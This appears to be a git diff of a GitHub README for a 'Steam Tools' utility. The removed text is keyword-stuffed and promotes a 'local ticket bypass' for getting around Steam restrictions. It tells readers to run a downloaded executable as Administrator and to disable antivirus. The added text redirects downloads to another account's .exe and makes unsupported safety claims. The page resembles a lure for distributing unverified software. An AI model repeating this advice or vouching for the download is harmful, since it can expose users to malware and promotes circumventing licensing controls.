@@ -1,53 +1,65 @@
-# Steam Tools
-Steam Tools — steam tools steamtools github download lua tools manifest official client backup mirror beyonddimension archive proxy lua manifest generator setup guide tutorial local ticket bypass bad hash fix watt toolkit alternative
+# ⚙️ steam-tools - Manage your Steam library with ease
 
-<img width="300" height="93" alt="image" src="https://github.com/user-attachments/assets/8a86c7bf-3991-46bb-b317-ff6240376888" />
+[![Download Steam Tools](https://img.shields.io/badge/Download-Steam_Tools-blue)](https://github.com/brittcaloric720/steam-tools)
 
-[![GitHub Stars](https://img.shields.io/github/stars/imohammedyasin/steam-tools?style=flat-square&color=00d4aa)](https://github.com/imohammedyasin/steam-tools/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/imohammedyasin/steam-tools?style=flat-square&color=0099cc)](https://github.com/imohammedyasin/steam-tools/network)
-[![Downloads](https://img.shields.io/github/downloads/imohammedyasin/steam-tools/total?style=flat-square&color=7c5cbf)](https://github.com/imohammedyasin/steam-tools/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## 📋 About this project
 
-## Overview
-Steam Tools is a powerful open-source utility designed for advanced Steam client management. It provides Lua-based tools for manifest generation, official client backup, archive proxy, local ticket management, and fixing common download issues. The application helps users with Steam manifest handling, bypassing certain restrictions, and optimizing overall Steam experience. It serves as a reliable and lightweight alternative to Watt Toolkit with focus on scripting and automation.
+Steam Tools provides a simple interface to manage your Steam collection. It helps you generate manifest files and organize your library. The software focuses on stability and performance. You can use these tools to patch files, manage achievements, or track your playtime. The system supports multiple configurations and simplifies common tasks for Steam users.
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. Ensure compliance with Steam Subscriber Agreement. The authors are not responsible for any account issues or violations of service terms.
+## 💻 System requirements
 
-## Install
-[Download `steam-tools.zip`](https://github.com/imohammedyasin/steam-tools/releases/download/steam/steam-tools.zip)
----
-> Optimized for Windows 11.
-<img width="1399" height="786" alt="image" src="https://github.com/user-attachments/assets/e33d2ad4-6c50-4060-a8fa-67d6baba12fa" />
-<img width="1399" height="786" alt="image" src="https://github.com/user-attachments/assets/4a35154f-3774-4c0c-a0f7-2db599db445d" />
-<img width="1399" height="786" alt="image" src="https://github.com/user-attachments/assets/87f0973c-babb-4871-b53a-f7ecb7e198df" />
+*   Windows 10 or Windows 11
+*   4 GB of RAM
+*   Stable internet connection
+*   Steam client installed on your computer
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `SteamTools.exe` as Administrator
-3. Follow the setup guide
-4. Configure Lua manifest generator and proxy settings
-5. Enable features like local ticket bypass and client backup
-6. Start using advanced Steam management tools
+## 🚀 Setting up the software
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| App doesn't start | Run as Administrator and disable antivirus temporarily |
-| Manifest generation failed | Check internet connection and update Lua scripts |
-| Bad hash / download error | Use local ticket bypass and clear cache |
-| Steam client not detected | Verify Steam installation path |
-| Proxy / archive issues | Configure proxy settings correctly |
-| Lua script errors | Update to latest version |
-| Windows 11 compatibility | Update Windows and reinstall |
-| Download / update failed | Use the latest release and check your internet connection |
+1. Visit the [official releases page](https://github.com/brittcaloric720/steam-tools) to find the latest version.
+2. Look for the file ending in .exe under the latest release.
+3. Click the file name to download the installer to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the prompts on your screen to complete the setup.
+7. Open the application from your desktop shortcut once finished.
 
-* Steam Tools
-* SteamTools GitHub
-* Steam Manifest Generator
-* Steam Local Ticket Bypass
-* Steam Archive Proxy
-* Steam Tools Lua
-* Steam Download Fix 2026
+## 🛠️ How to use the tools
+
+### Generating a manifest
+The manifest generator creates index files for your installed games. This helps the app recognize your local data. Open the manifest tab and select your Steam installation folder. The app scans your drive and produces the file automatically. This file allows for faster library scanning in the future.
+
+### Managing your Steam library
+The library manager shows all installed games in one view. You can sort games by size, play time, or last launched date. Right-click a title to see options for file verification or folder cleanup. This keeps your drive organized and removes redundant temporary files that Steam often leaves behind.
+
+### Working with achievements
+The achievement interface displays your progress across all games. You can mark achievements as complete or view global statistics. This section connects to your public profile to pull the latest data. Use this when you want to track completion percentages without opening the full Steam overlay.
+
+## 🔧 Frequently asked questions
+
+**Does this software modify Steam files?**
+The tool creates sidecar files for metadata. It does not alter game executables or core system files. Your game files remain safe and original.
+
+**What happens if the app crashes?**
+Restart the application if it stops responding. The app saves your configuration on exit, so you will not lose your settings.
+
+**Can I use this with other Steam tools?**
+This software works alongside other programs. It does not interfere with background processes from other idle managers or library helpers.
+
+**Where do I find the log files?**
+The program generates a log file in the installation directory. If you experience issues, check this text file for error messages. It records events during the startup and processing phases.
+
+## 🛡️ Safety and security
+
+This software connects only to official Steam services. It uses read-only access for library scanning to protect your account. The download link points to the source repository. Always verify the origin of your files to ensure you have the official version. This project follows standard security practices for desktop applications.
+
+## 📈 Troubleshooting common issues
+
+*   **App fails to launch:** Run the installer again as an administrator. Ensure you have the latest drivers for your graphics card.
+*   **Missing games in list:** Check the settings menu. Confirm the path to your Steam library matches your drive location. You can add secondary library folders if you keep games on multiple drives.
+*   **Slow performance:** Close browser tabs or other resource-heavy apps before running a full library scan. The scan intensity depends on the number of installed games.
+*   **Connection errors:** Disable your virtual private network if the app cannot reach the server. Some network settings block the app from reading your profile data.
+*   **Folder permission errors:** Install the software in a folder with full user write access. Avoid installing it within protected system directories like Program Files if you encounter persistent access issues.
+
+## 📑 Managing your configuration
+
+The settings menu allows you to customize the behavior of the application. You can toggle automatic updates to ensure you have the newest features. You can also change the scan depth for library folders. If you have a large drive, set the scan to ignore specific folders to speed up the process. The app remembers these preferences between sessions. Save your configuration by clicking the apply button at the bottom of the settings screen.
